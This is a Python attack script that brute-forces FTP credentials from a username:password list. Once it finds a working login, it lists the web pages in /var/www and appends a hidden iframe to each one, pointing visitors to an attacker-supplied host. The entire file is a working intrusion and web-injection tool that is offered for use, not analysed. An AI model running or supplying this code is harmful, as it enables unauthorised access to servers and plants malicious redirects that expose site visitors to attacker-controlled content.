import ftplib
import argparse
import sys

# This script will attempt to bruteforce an FTP login. 
# If successful it will then attempt to inject a redirect script into a /var/www file.

def brute_force(target_host, user_pass_file):

	file = open(user_pass_file, "r")

	for user_pass in file:

		try:

			username = user_pass.split(":")[0]
			password = user_pass.split(":")[1].strip("\n")
			ftp = ftplib.FTP(target_host)
			ftp.login(user=username, passwd=password)
			print(f"[+] Found username and password: {username} / {password}")
			ftp.quit()
			return (username, password)

		except:

			print(f"[*] Trying {username} / {password}")
			pass

	print(f"[-] Could not brute force FTP credentials")
	file.close()
	return (None, None)


def list_files(ftp_conn):

	try:

		print("[*] Listing files in current directory...")
		file_list = ftp_conn.nlst()
		for file in file_list:
			print(f"[+] Found file: {file}")

	except:

		file_list = []
		print("[-] No files found in current directory")

	default_files = []

	for file in file_list:

		if ".php" in file or ".html" in file or ".asp" in file:

			default_files.append(file)
			print(f"[+] Found default web page: {file}")

	return default_files


def inject_redirect(ftp_conn, page, redirect):

	f = open(f"{page}.tmp", "w")
	ftp_conn.retrlines(f"RETR {page}", f.write)
	print(f"[*] Downloading page: {page}")
	f.write(redirect)
	print(f"[*] Injecting redirect: {redirect}")
	f.close()
	ftp_conn.storlines(f"STOR {page}", open(f"{page}.tmp", "rb"))
	print(f"[*] Successfully injected page: {page}")



def main():

	parser = argparse.ArgumentParser()
	parser.add_argument("-t", dest="target", help="Specify the hostname or IP address of your target.")
	parser.add_argument("-p", dest="password_file", help="Specify the password list to use for the brute-force.")


	if len(sys.argv) != 5:

		parser.print_help(sys.stderr)
		sys.exit(1)

	args = parser.parse_args()

	target_host = args.target
	password_file = args.password_file

	username, password = brute_force(target_host, password_file)

	if username != None and password != None:

		ftp_conn = ftplib.FTP(target_host)
		ftp_conn.login(username, password)
		ftp_conn.cwd("/var/www")
		web_pages = list_files(ftp_conn)

		for page in web_pages:

			redirect = "<iframe src='http://<INSERT REDIRECT HOST>/'></iframe>"
			inject_redirect(ftp_conn, page, redirect)

		ftp_conn.quit()



if __name__ == "__main__":

	main()


